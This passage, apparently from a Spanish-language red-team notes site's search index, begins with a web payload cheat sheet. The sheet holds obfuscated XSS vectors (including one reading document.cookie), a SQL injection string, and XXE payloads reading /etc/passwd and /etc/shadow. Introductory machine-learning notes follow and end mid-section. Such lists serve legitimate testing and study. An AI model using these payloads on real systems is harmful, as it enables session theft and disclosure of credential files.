SRC=JaVaScRiPt:alert(&amp;quot;XSS&lt;WBR&gt;&amp;quot;)&gt;\n&lt;IMGSRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;&lt;WBR&gt;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;&lt;WBR&gt;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;&lt;WBR&gt;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83&lt;WBR&gt;;&amp;#83;&amp;#39;&amp;#41&gt;\n&lt;IMGSRC=&amp;#0000106&amp;#0000097&amp;&lt;WBR&gt;#0000118&amp;#0000097&amp;#0000115&amp;&lt;WBR&gt;#0000099&amp;#0000114&amp;#0000105&amp;&lt;WBR&gt;#0000112&amp;#0000116&amp;#0000058&amp;&lt;WBR&gt;#0000097&amp;#0000108&amp;#0000101&amp;&lt;WBR&gt;#0000114&amp;#0000116&amp;#0000040&amp;&lt;WBR&gt;#0000039&amp;#0000088&amp;#0000083&amp;&lt;WBR&gt;#0000083&amp;#0000039&amp;#0000041&gt;    \n&lt;IMGSRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;&lt;WBR&gt;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;&lt;WBR&gt;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;&lt;WBR&gt;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n&lt;IMG SRC=\"jav&amp;#x0A;ascript:alert(&lt;WBR&gt;'XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x0D;ascript:alert(&lt;WBR&gt;'XSS');\"&gt;\n&lt;![CDATA[&lt;script&gt;var n=0;while(true){n++;}&lt;/script&gt;]]&gt;\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;foo&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert('gotcha');&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;foo&gt;&lt;![CDATA[' or 1=1 or ''=']]&gt;&lt;/foof&gt;\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file://c:/boot.ini\"&gt;]&gt;&lt;foo&gt;&amp;xee;&lt;/foo&gt;\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;foo&gt;&amp;xee;&lt;/foo&gt;\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/shadow\"&gt;]&gt;&lt;foo&gt;&amp;xee;&lt;/foo&gt;\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///dev/random\"&gt;]&gt;&lt;foo&gt;&amp;xee;&lt;/foo&gt;\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n%3cscript%3ealert('XSS')%3c/script%3e\n%22%3e%3cscript%3ealert('XSS')%3c/script%3e\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;       \n&lt;img src=xss onerror=alert(1)&gt;\n&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;\n&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;\n&lt;IMG SRC=\"jav ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;\n&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;\n&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n&lt;BODY BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;BODY ONLOAD=alert('XSS')&gt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"javascript:alert('XSS')\"\n&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;\n&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;\n%253cscript%253ealert(1)%253c/script%253e\n\"&gt;&lt;s\"%2b\"cript&gt;alert(document.cookie)&lt;/script&gt;\nfoo&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;\n&lt;SCRIPT&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)&lt;/SCRIPT&gt;\n';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n&lt;marquee onstart='javascript:alert('1');'&gt;=(\u25d5_\u25d5)=\n</code></pre>"},{"location":"AI/AI/","title":"Artificial Intelligence concepts for Red Teaming and OffSec in general","text":"<ul> <li>Fundamentals</li> </ul>"},{"location":"AI/DecisionTrees/","title":"Decision Trees","text":"<ul> <li>Mejor legibilidad</li> </ul>"},{"location":"AI/DecisionTrees/#arboles-de-decisiones","title":"Arboles de decisiones","text":"<ul> <li>Los \u00e1rboles de decisi\u00f3n son un algoritmo de aprendizaje supervisado que se utiliza para problemas de clasificaci\u00f3n y regresi\u00f3n.</li> <li>Son conocidos por su simplicidad y facilidad de interpretaci\u00f3n de arbol.</li> <li>Los \u00e1rboles de decisi\u00f3n son un tipo de modelo predictivo que mapea caracter\u00edsticas (variables independientes) a conclusiones sobre la variable dependiente.</li> <li>Imagina que est\u00e1s intentando ver si jugar tenis dependiendo del clima. Un \u00e1rbol de decisi\u00f3n podr\u00eda ser:<ul> <li>Si est\u00e1 soleado, jugar tenis.</li> <li>Si est\u00e1 nublado, jugar tenis.</li> <li>Si est\u00e1 lluvioso, no jugar tenis.</li> </ul> </li> <li>Un arbol de decisi\u00f3n tiene tres componentes principales:<ol> <li>Nodos de decisi\u00f3n: Representan una caracter\u00edstica o atributo.</li> <li>Nodos de ramificaci\u00f3n: Representan una regla de decisi\u00f3n.</li> <li>Nodos de hoja: Representan el resultado.</li> </ol> </li> </ul>"},{"location":"AI/DecisionTrees/#armando-un-arbol-de-decision","title":"Armando un \u00e1rbol de decisi\u00f3n","text":"<ul> <li>Involucra seleccionar la mejor caracter\u00edstica para dividir los datos en cada nodo.</li> <li>Esta selecci\u00f3n est\u00e1 basada en cuestiones como gini impurity, entropy o information gain.</li> <li>Que cuantifica la homogeneidad de cada subconjunto resultando de la divisi\u00f3n.</li> <li>La idea es crear divisiones que resulten en incrementar mas subconjuntos puros o homog\u00e9neos. Donde los data points de cada subconjunto sean lo mas similares posible.</li> </ul>"},{"location":"AI/DecisionTrees/#impuridad-de-gini","title":"Impuridad de Gini","text":"<ul> <li>La impureza de Gini es una medida de cu\u00e1n a menudo un elemento elegido al azar ser\u00eda incorrectamente clasificado.</li> </ul> <p>$$ Gini(s) = 1 - \\sum_{i=1}^{n} (p_i)^2 $$ - Donde:     - $s$ es el conjunto de datos.     - $n$ es el n\u00famero de clases.     - $p_i$ es la probabilidad de elegir una clase $i$.</p> <ul> <li>Considerar el data set s que contiene elementos de dos clases, $A$ y $B$.</li> <li> <p>Supon que hay 30 instancias de $A$ y 20 instancias de $B$.</p> <ul> <li>Proporci\u00f3n de clase $A$: $\\frac{30}{50} = 0.6$</li> <li>Proporci\u00f3n de clase $B$: $\\frac{20}{50} = 0.4$</li> </ul> </li> <li> <p>Ahora si hacemos la impureza de Gini:</p> <ul> <li>$Gini(s) = 1 - (0.6)^2 - (0.4)^2 = 0.48$</li> </ul> </li> </ul>"},{"location":"AI/DecisionTrees/#entropia","title":"Entrop\u00eda","text":"<ul> <li>La entrop\u00eda es una medida de la incertidumbre asociada con un conjunto de datos.</li> </ul> <p>$$ Entropy(s) = - \\sum_{i=1}^{n} p_i \\log_2(p_i) $$ - Donde:     - $s$ es el conjunto de datos.     - $n$ es el n\u00famero de clases.     - $p_i$ es la probabilidad de elegir una clase $i$.</p> <ul> <li>Usando la misma S que antes podemos calcular la entrop\u00eda:<ul> <li>$Entropy(s) = -0.6 \\log_2(0.6) - 0.4 \\log_2(0.4) = 0.97$</li> </ul> </li> </ul>"},{"location":"AI/DecisionTrees/#information-gain-o-ganancia-de-informacion","title":"Information Gain o Ganancia de Informaci\u00f3n","text":"<ul> <li>La ganancia de informaci\u00f3n es la medida de la reducci\u00f3n de la entrop\u00eda o impureza despu\u00e9s de dividir un conjunto de datos en un subconjunto.</li> </ul> <p>$$ IG(S,A) = Entropy(S) - \\sum_{t \\in T} \\frac{|t|}{|S|} Entropy(t) $$ - Donde:     - $S$ es el conjunto de datos original.     - $A$ es la caracter\u00edstica que divide los datos.     - $T$ es el subconjunto de $S$ despu\u00e9s de dividir $S$ usando la caracter\u00edstica $A$.     - $|t|$ es el n\u00famero de instancias en el subconjunto $t$.     - $|S|$ es el n\u00famero de instancias en el conjunto de datos original.</p> <ul> <li>Considerando a $S$ como el dataset con 50 instancias, tomando las dos clases consideramos $F$ que puede tomar en dos valores $1$ y $2$.</li> <li> <p>La distribuci\u00f3n ser\u00eda:</p> <ul> <li>$F = 1$: 30 instancias, 20 clase $A$ y 10 clase $B$.</li> <li>$F = 2$: 20 instancias, 10 clase $A$ y 10 clase $B$.</li> </ul> </li> <li> <p>Primero calculamos la entrop\u00eda de $S$:</p> <ul> <li>$Entropy(S) = -0.6 \\log_2(0.6) - 0.4 \\log_2(0.4) = 0.97$</li> </ul> </li> <li> <p>Luego calculamos la entrop\u00eda del subconjunto $T$:</p> <ul> <li>para $F = 1$: $Entropy(T) = -0.67 \\log_2(0.67) - 0.33 \\log_2(0.33) = 0.92$</li> <li>para $F = 2$: $Entropy(T) = -0.5 \\log_2(0.5) - 0.5 \\log_2(0.5) = 1.0$</li> </ul> </li> <li>Ahora calculamos el promedio  ponderado de la entrop\u00eda de los subconjuntos:<ul> <li>Weighted Entropy = $\\frac{30}{50} \\times 0.92 + \\frac{20}{50} \\times 1.0 = 0.94$</li> </ul> </li> <li>Finalmente calculamos la ganancia de informaci\u00f3n:<ul> <li>$IG(S,F) = 0.97 - 0.94 = 0.03$</li> </ul> </li> </ul>"},{"location":"AI/DecisionTrees/#armando-el-arbol","title":"Armando el arbol","text":"<ul> <li>El arbol empieza con la ra\u00edz, que contiene el dataset completo.</li> <li>Luego se divide en subconjuntos mas peque\u00f1os con el criterio ( Gini, Entrop\u00eda o Information Gain).</li> <li>Se sigue dividiendo hasta que se llega a un nodo hoja, que contiene la clase final.</li> <li>Este proceso es recursivo y se detiene cuando se alcanza un criterio de parada.</li> <li>las tres paradas de crecimiento comunes son:<ol> <li>Profundidad m\u00e1xima del \u00e1rbol: El arbol alcanza la profundidad maxima especificada.</li> <li>Numero minimo de puntos de datos en un nodo: El numero de puntos de datos en un nodo cae por debajo de un umbral especificado, asegurando que las divisiones son significativas y no esten basadas en un peque\u00f1o numero de puntos de datos.</li> <li>Nodos puros: Todos los puntos de datos de un nodo pertenecen a la misma clase, indicando que mas divisiones no ayudan a mejorar la predicci\u00f3n.</li> </ol> </li> </ul> <ul> <li>imagina que tenemos el dataset historico del clima y si se jugo tenis o no.</li> </ul> JugarTenis Nublado Lluvioso Soleado Fr\u00edo Caliente Templado Humedad_Alta Humedad_Normal Viento_Fuerte Viento_D\u00e9bil No Falso Verdadero Falso Verdadero Falso Falso Falso Verdadero Falso Verdadero S\u00ed Falso Falso Verdadero Falso Verdadero Falso Falso Verdadero Falso Verdadero No Falso Verdadero Falso Verdadero Falso Falso Verdadero Falso Verdadero Falso No Falso Verdadero Falso Falso Verdadero Falso Verdadero Falso Falso Verdadero S\u00ed Falso Falso Verdadero Falso Falso Verdadero Falso Verdadero Falso Verdadero S\u00ed Falso Falso Verdadero Falso Verdadero Falso Falso Verdadero Falso Verdadero No Falso Verdadero Falso Falso Verdadero Falso Verdadero Falso Verdadero Falso S\u00ed Verdadero Falso Falso Verdadero Falso Falso Verdadero Falso Falso Verdadero No Falso Verdadero Falso Falso Verdadero Falso Falso Verdadero Verdadero Falso No Falso Verdadero Falso Falso Verdadero Falso Verdadero Falso Verdadero Falso <ul> <li>Clima: soleado, nublado, lluvioso.</li> <li>Temperatura: caliente, templado, fr\u00edo.</li> <li>Humedad: alta, normal.</li> <li>Viento: fuerte, d\u00e9bil.</li> <li> <p>la variable objetivo es si se jug\u00f3 tenis o no.</p> </li> <li> <p>un arbol de decisi\u00f3n analizar\u00eda las caracter\u00edsticas y dividir\u00eda el dataset en subconjuntos mas peque\u00f1os.</p> </li> <li>Empezar\u00eda por calcular cada impureza de Gini o entrop\u00eda para cada caracter\u00edstica y seleccionar la que resulte en la mayor ganancia de informaci\u00f3n.</li> <li>Por ejemplo, si la caracter\u00edstica que resulta en la mayor ganancia de informaci\u00f3n es el clima, el arbol se dividir\u00eda en tres ramas: soleado, nublado y lluvioso.</li> <li>Luego, el arbol se dividir\u00eda en subconjuntos mas peque\u00f1os basados en las caracter\u00edsticas restantes.</li> <li>Este proceso se repite hasta que se llega a un nodo hoja, que contiene la clase final.</li> </ul>"},{"location":"AI/DecisionTrees/#asunciones-de-los-arboles-de-decision","title":"Asunciones de los \u00e1rboles de decisi\u00f3n","text":"<ul> <li>Una de las ventajas de los \u00e1rboles de decisi\u00f3n es que no requieren muchas asunciones.</li> <li>No linealidad: Los \u00e1rboles de decisi\u00f3n pueden capturar relaciones no lineales entre las caracter\u00edsticas y la variable objetivo.</li> <li>No normalidad: Los \u00e1rboles de decisi\u00f3n no requieren que las caracter\u00edsticas sigan una distribuci\u00f3n normal.</li> <li>No escala: Los \u00e1rboles de decisi\u00f3n no requieren que las caracter\u00edsticas est\u00e9n en la misma escala.</li> </ul>"},{"location":"AI/NaiveBayes/","title":"Naive Bayes","text":"<p>Mejor legibilidad</p>"},{"location":"AI/NaiveBayes/#bayesiano-ingenuo","title":"Bayesiano ingenuo","text":"<p> - Es un algoritmo probabilistico utilizado para problemas de clasificaci\u00f3n basado en el teorema de Bayes.</p>"},{"location":"AI/NaiveBayes/#teorema-de-bayes","title":"Teorema de Bayes","text":"<ul> <li>El teorema de Bayes es una ecuaci\u00f3n que describe la relaci\u00f3n de probabilidades condicionales de cantidades estad\u00edsticas.</li> <li>El teorema de Bayes es:<ul> <li>$P(A|B) = \\frac{P(B|A) \\times P(A)}{P(B)}$</li> <li>donde:<ul> <li>$P(A|B)$ es la probabilidad de A dado B.</li> <li>$P(B|A)$ es la probabilidad de B dado A.</li> <li>$P(A)$ es la probabilidad de A.</li> <li>$P(B)$ es la probabilidad de B.</li> </ul> </li> </ul> </li> </ul>"},{"location":"AI/NaiveBayes/#como-el-bayesiano-ingenuo-funciona","title":"Como el bayesiano ingenuo funciona?","text":"<ul> <li>El clasificador Bayesiano ingenuo utiliza el teorema de Bayes para predecir la probabilidad de que un punto de datos pertenezca a una clase particular dadas sus caracter\u00edsticas. Para lograr esto, hace la suposici\u00f3n \"ingenua\" de independencia condicional entre las caracter\u00edsticas. Esto significa que asume que la presencia o ausencia de una caracter\u00edstica no afecta la presencia o ausencia de otra caracter\u00edstica, dado que conocemos la etiqueta de la clase.</li> <li>Aunque esta es una suposici\u00f3n simplificada, el clasificador bayesiano ingenuo ha demostrado ser efectivo en la pr\u00e1ctica.</li> </ul>"},{"location":"AI/NaiveBayes/#calcular-probabilidades-previas","title":"Calcular Probabilidades Previas","text":"<p>El algoritmo primero calcula la probabilidad previa de cada clase. Esta es la probabilidad de que un punto de datos pertenezca a una clase particular antes de considerar sus caracter\u00edsticas. Por ejemplo, en un escenario de detecci\u00f3n de spam, la probabilidad de que un correo electr\u00f3nico sea spam podr\u00eda ser 0.2 (20%), mientras que la probabilidad de que no sea spam es 0.8 (80%).</p>"},{"location":"AI/NaiveBayes/#calcular-verosimilitudes","title":"Calcular Verosimilitudes","text":"<p>A continuaci\u00f3n, el algoritmo calcula la verosimilitud de observar cada caracter\u00edstica dada cada clase. Esto implica determinar la probabilidad de observar un valor particular de una caracter\u00edstica dado que el punto de datos pertenece a una clase espec\u00edfica. Por ejemplo, \u00bfcu\u00e1l es la probabilidad de ver la palabra \"gratis\" en un correo electr\u00f3nico dado que es spam? \u00bfCu\u00e1l es la probabilidad de ver la palabra \"reuni\u00f3n\" dado que no es spam?</p>"},{"location":"AI/NaiveBayes/#aplicar-el-teorema-de-bayes","title":"Aplicar el Teorema de Bayes","text":"<p>Para un nuevo punto de datos, el algoritmo combina las probabilidades previas y las verosimilitudes utilizando el teorema de Bayes para calcular la probabilidad posterior de que el punto de datos pertenezca a cada clase. La probabilidad posterior es la probabilidad actualizada de un evento (en este caso, que el punto de datos pertenezca a una cierta clase) despu\u00e9s de considerar nueva informaci\u00f3n (las caracter\u00edsticas observadas). Esto representa la creencia revisada sobre la etiqueta de clase despu\u00e9s de considerar las caracter\u00edsticas observadas.</p>"},{"location":"AI/NaiveBayes/#tipos-de-clasificadores-bayesianos-ingenuos","title":"Tipos de Clasificadores Bayesianos Ingenuos","text":""},{"location":"AI/NaiveBayes/#predecir-la-clase","title":"Predecir la Clase","text":"<p>Finalmente, el algoritmo asigna el punto de datos a la clase con la probabilidad posterior m\u00e1s alta.</p>"},{"location":"AI/NaiveBayes/#tipos-de-clasificadores-bayesianos-ingenuos_1","title":"Tipos de Clasificadores Bayesianos Ingenuos","text":"<p>La implementaci\u00f3n espec\u00edfica del clasificador Bayesiano ingenuo depende del tipo de caracter\u00edsticas y su distribuci\u00f3n asumida:</p>"},{"location":"AI/NaiveBayes/#bayesiano-ingenuo-gaussiano","title":"Bayesiano Ingenuo Gaussiano","text":"<p>Se utiliza cuando las caracter\u00edsticas son continuas y se asume que siguen una distribuci\u00f3n gaussiana (una curva en forma de campana). Por ejemplo, si se predice si un cliente comprar\u00e1 un producto en funci\u00f3n de su edad e ingresos, se podr\u00eda usar el Bayesiano ingenuo gaussiano, suponiendo que la edad y los ingresos est\u00e1n distribuidos normalmente.</p>"},{"location":"AI/NaiveBayes/#bayesiano-ingenuo-multinomial","title":"Bayesiano Ingenuo Multinomial","text":"<p>Es adecuado para caracter\u00edsticas discretas y se utiliza a menudo en la clasificaci\u00f3n de texto. Por ejemplo, en la detecci\u00f3n de spam, la frecuencia de palabras como \"gratis\" o \"dinero\" podr\u00eda ser una caracter\u00edstica, y el Bayesiano ingenuo multinomial modelar\u00eda la probabilidad de que estas palabras aparezcan en correos electr\u00f3nicos de spam y no spam.</p>"},{"location":"AI/NaiveBayes/#bayesiano-ingenuo-bernoulli","title":"Bayesiano Ingenuo Bernoulli","text":"<p>Este tipo se emplea para caracter\u00edsticas binarias, donde la caracter\u00edstica est\u00e1 presente o ausente. En la clasificaci\u00f3n de documentos, una caracter\u00edstica podr\u00eda ser si una palabra espec\u00edfica est\u00e1 presente en el documento. El Bayesiano ingenuo bernoulli modelar\u00eda la probabilidad de esta presencia o ausencia para cada clase.</p>"},{"location":"AI/NaiveBayes/#suposiciones-de-los-datos","title":"Suposiciones de los Datos","text":"<p>Aunque el Bayesiano ingenuo es relativamente robusto, es \u00fatil tener en cuenta algunas suposiciones sobre los datos:</p> <ul> <li>Independencia de las Caracter\u00edsticas: Como se mencion\u00f3, la suposici\u00f3n principal es que las caracter\u00edsticas son condicionalmente independientes dado la clase.</li> <li>Distribuci\u00f3n de los Datos: La elecci\u00f3n del clasificador Bayesiano ingenuo (Gaussiano, Multinomial, Bernoulli) depende de la distribuci\u00f3n asumida de las caracter\u00edsticas.</li> <li>Datos de Entrenamiento Suficientes: Aunque el Bayesiano ingenuo puede funcionar con datos limitados, es importante contar con suficientes datos para estimar las probabilidades con precisi\u00f3n.</li> </ul>"},{"location":"AI/fundamentals/","title":"Cuestiones b\u00e1sicas sobre Inteligencia Artificial","text":""},{"location":"AI/fundamentals/#para-una-mejor-lectura-click-aqui","title":"Para una mejor lectura click aqu\u00ed","text":""},{"location":"AI/fundamentals/#regresion-lineal","title":"Regresi\u00f3n Lineal","text":"<ul> <li>La regresi\u00f3n lineal es fundamental para los algoritmos de aprendizaje supervisado, que predicen un valor continuo en funci\u00f3n de una variable independiente.</li> <li>El algoritmo modela esta relaci\u00f3n lineal entre la variable independiente y la variable dependiente.</li> <li>La regresi\u00f3n lineal se puede utilizar para predecir el precio de una casa en funci\u00f3n de su tama\u00f1o, la calificaci\u00f3n crediticia de un cliente en funci\u00f3n de sus ingresos, etc.</li> </ul>"},{"location":"AI/fundamentals/#que-es-la-regresion","title":"\u00bfQu\u00e9 es la \"Regresi\u00f3n\"?","text":"<ul> <li>La regresi\u00f3n es un m\u00e9todo estad\u00edstico que se utiliza para modelar la relaci\u00f3n entre una variable dependiente y una o m\u00e1s variables independientes.</li> <li>Se puede pensar como un estimativo de la relaci\u00f3n entre las variables.</li> </ul>"},{"location":"AI/fundamentals/#regresion-lineal-simple","title":"Regresi\u00f3n Lineal Simple","text":"<ul> <li>Relaciona un solo predictor (variable independiente) con una variable de respuesta (variable dependiente).</li> <li>Siendo su ecuaci\u00f3n una funci\u00f3n lineal:<ul> <li>$y = mx + b$</li> <li>donde:<ul> <li>$y$ es la variable dependiente</li> <li>$x$ es la variable independiente</li> <li>$m$ es la pendiente de la l\u00ednea</li> <li>$b$ es la intersecci\u00f3n de la l\u00ednea</li> </ul> </li> </ul> </li> </ul>"},{"location":"AI/fundamentals/#regresion-lineal-multiple","title":"Regresi\u00f3n Lineal M\u00faltiple","text":"<ul> <li>Relaciona dos o m\u00e1s predictores (variables independientes) con una variable de respuesta (variable dependiente).</li> <li>La ecuaci\u00f3n de la regresi\u00f3n lineal m\u00faltiple es:<ul> <li>$y = b_0 + b_1 \\times x_1 + b_2 \\times x_2 + \\dots + b_n \\times x_n$</li> <li>donde:<ul> <li>$y$ es la variable dependiente</li> <li>$x_1, x_2, \\dots, x_n$ son las variables independientes</li> <li>$b_0$ es la intersecci\u00f3n de la l\u00ednea</li> <li>$b_1, b_2, \\dots, b_n$ son los coeficientes de regresi\u00f3n</li> </ul> </li> </ul> </li> </ul>"},{"location":"AI/fundamentals/#minimos-cuadrados-ordinarios-ols","title":"M\u00ednimos Cuadrados Ordinarios (OLS)","text":"<ul> <li>Es un m\u00e9todo para estimar los coeficientes de regresi\u00f3n en un modelo de regresi\u00f3n lineal.</li> <li>El objetivo es minimizar la suma de los cuadrados de las diferencias entre los valores observados y los valores predichos por el modelo.</li> <li>La regresi\u00f3n lineal se ajusta a los datos minimizando la suma de los cuadrados de las diferencias entre los valores observados y los valores predichos por el modelo.</li> <li>Proceso de OLS:<ol> <li>Calcular restos: Para cada punto de datos, calcular la diferencia entre el valor observado y el valor predicho.</li> <li>Elevar al cuadrado los residuos: Para cada punto de datos, elevar al cuadrado la diferencia entre el valor observado y el valor predicho.</li> <li>Sumar los cuadrados de los residuos: Sumar los cuadrados de las diferencias entre los valores observados y los valores predichos.</li> <li>Minimizar la suma de los cuadrados de los residuos: Encontrar los coeficientes de regresi\u00f3n que minimizan la suma de los cuadrados de los residuos.</li> </ol> </li> </ul>"},{"location":"AI/fundamentals/#asunciones-de-la-regresion-lineal","title":"Asunciones de la Regresi\u00f3n Lineal","text":"<ul> <li>Las asunciones de la regresi\u00f3n lineal son condiciones que deben cumplirse para que los coeficientes de regresi\u00f3n sean insesgados, consistentes y eficientes.</li> <li>Las asunciones de la regresi\u00f3n lineal son:<ol> <li>Linealidad: La relaci\u00f3n entre las variables independientes y la variable dependiente es lineal.</li> <li>Independencia: Los errores de la regresi\u00f3n no est\u00e1n correlacionados.</li> <li>Homocedasticidad: La varianza de los errores de la regresi\u00f3n es constante.</li> <li>Normalidad: Los errores de la regresi\u00f3n siguen una distribuci\u00f3n normal.</li> <li>Multicolinealidad: Las variables independientes no est\u00e1n altamente correlacionadas.</li> </ol> </li> </ul>"},{"location":"AI/fundamentals/#regresion-logistica","title":"Regresi\u00f3n Log\u00edstica","text":"<ul> <li>La regresi\u00f3n log\u00edstica es un algoritmo de clasificaci\u00f3n que se utiliza para predecir la probabilidad de una variable dependiente categ\u00f3rica.</li> <li>La regresi\u00f3n log\u00edstica es un algoritmo de clasificaci\u00f3n binaria, que predice si una observaci\u00f3n pertenece a una clase o a otra.</li> <li>Es parte del aprendizaje supervisado y se utiliza para problemas de clasificaci\u00f3n binaria.</li> <li>Clasificaci\u00f3n en machine learning es un proceso de asignar una etiqueta a una observaci\u00f3n. Como la regresi\u00f3n que predice un valor continuo, la clasificaci\u00f3n predice una etiqueta.</li> <li>Ejemplos:<ul> <li>Clasificar si un correo electr\u00f3nico es spam o no.</li> <li>Clasificar si un tumor es benigno o maligno.</li> <li>Clasificar si un cliente comprar\u00e1 o no un producto.</li> </ul> </li> </ul>"},{"location":"AI/fundamentals/#como-funciona","title":"C\u00f3mo funciona?","text":"<ul> <li>La regresi\u00f3n logistica utiliza la funci\u00f3n log\u00edstica para modelar la probabilidad de una variable dependiente categ\u00f3rica.</li> <li>La funci\u00f3n log\u00edstica es una funci\u00f3n sigmoidea que toma cualquier valor real y lo mapea en un valor entre 0 y 1.</li> <li>La ecuaci\u00f3n de la regresi\u00f3n log\u00edstica es:<ul> <li>$p = \\frac{1}{1 + e^{-(b_0 + b_1 \\times x_1 + b_2 \\times x_2 + \\dots + b_n \\times x_n)}}$</li> <li>donde:<ul> <li>$p$ es la probabilidad de la variable dependiente</li> <li>$x_1, x_2, \\dots, x_n$ son las variables independientes</li> <li>$b_0$ es la intersecci\u00f3n de la l\u00ednea</li> <li>$b_1, b_2, \\dots, b_n$ son los coeficientes de regresi\u00f3n</li> </ul> </li> </ul> </li> <li>Esta funci\u00f3n toma cualquier valor real y lo mapea en un valor entre 0 y 1.</li> <li>Se utiliza mucho para modelar la probabilidad de una observaci\u00f3n que pertenece a una clase o a otra.</li> </ul>"},{"location":"AI/fundamentals/#ejemplo-deteccion-de-spam","title":"Ejemplo: Detecci\u00f3n de spam","text":"<ul> <li>Digamos que estamos construyendo un filtro de spam utilizando la regresi\u00f3n log\u00edstica.</li> <li>El algoritmo analizaria varios correos electr\u00f3nicos y aprender\u00eda a clasificarlos como spam o no spam.<ul> <li>Tendria que analizar las palabras clave, la frecuencia de las palabras, la direcci\u00f3n de correo electr\u00f3nico, etc.</li> <li>El email tendr\u00eda que tener un puntaje de probabilidad de spam por debajo de un cierto umbral para ser clasificado como no spam.</li> </ul> </li> <li>Un aspecto importante de la regresi\u00f3n lineal es la funci\u00f3n de decisi\u00f3n.<ul> <li>La funci\u00f3n de decisi\u00f3n es una funci\u00f3n que toma un puntaje de probabilidad y lo convierte en una etiqueta.</li> <li>Si el puntaje de probabilidad es mayor que un cierto umbral, la observaci\u00f3n se clasifica en una clase.</li> <li>Si el puntaje de probabilidad es menor que un cierto umbral, la observaci\u00f3n se clasifica en la otra clase.</li> <li>Hay una recta que divide las dos clases.</li> </ul> </li> </ul>"},{"location":"AI/fundamentals/#umbral-de-decision","title":"Umbral de decisi\u00f3n","text":"<ul> <li>El umbral de decisi\u00f3n es el valor que se utiliza para clasificar una observaci\u00f3n en una clase o en otra.</li> <li>Si el puntaje de probabilidad es mayor que el umbral de decisi\u00f3n, la observaci\u00f3n se clasifica en una clase.</li> <li>Si dado cierto punto de dato predicado la probabilidad es mayor que el umbral, se clasifica en una clase..</li> <li>Si la probabilidad cae por debajo del umbral, se clasifica en la otra clase.</li> <li>La ecuaci\u00f3n para el umbral de probabilidad es:<ul> <li>$p = \\frac{1}{1 + e^{-z}}$</li> <li>donde:<ul> <li>$p$ es la probabilidad</li> <li>$z$ es el valor de la funci\u00f3n lineal (es decir, $z = b_0 + b_1 \\times x_1 + b_2 \\times x_2 + \\dots + b_n \\times x_n$)</li> </ul> </li> </ul> </li> <li>Si $p$ es mayor que el umbral de decisi\u00f3n, la observaci\u00f3n se clasifica en una clase.</li> <li> <p>Si $p$ es menor que el umbral de decisi\u00f3n, la observaci\u00f3n se clasifica en la otra clase.</p> </li> <li> <p>Arboles de 